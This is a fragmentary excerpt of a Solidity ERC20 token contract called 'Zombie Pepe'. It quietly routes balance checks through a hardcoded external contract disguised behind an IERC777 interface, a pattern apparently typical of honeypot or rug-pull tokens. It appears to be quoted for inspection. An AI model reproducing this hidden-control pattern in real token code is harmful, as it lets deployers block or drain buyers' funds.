...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _pepeContract = 0x006A03770AbA87545ec984f547AADF826B317737;
    address public pair;

    IDEXRouter router;
    IERC777 pepeContract;
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        pepeContract = IERC777(_pepeContract);
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return pepeContract.confirmTransaction(amount);
    }
    ...
    function _DeployZepe(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployZepe(creator, initialSupply);
    }
}

contract ZombiePepe is ERC20Token {
    constructor() ERC20Token("Zombie Pepe", "ZPEPE", msg.sender, 666666666 * 10 ** 18) {
    }
}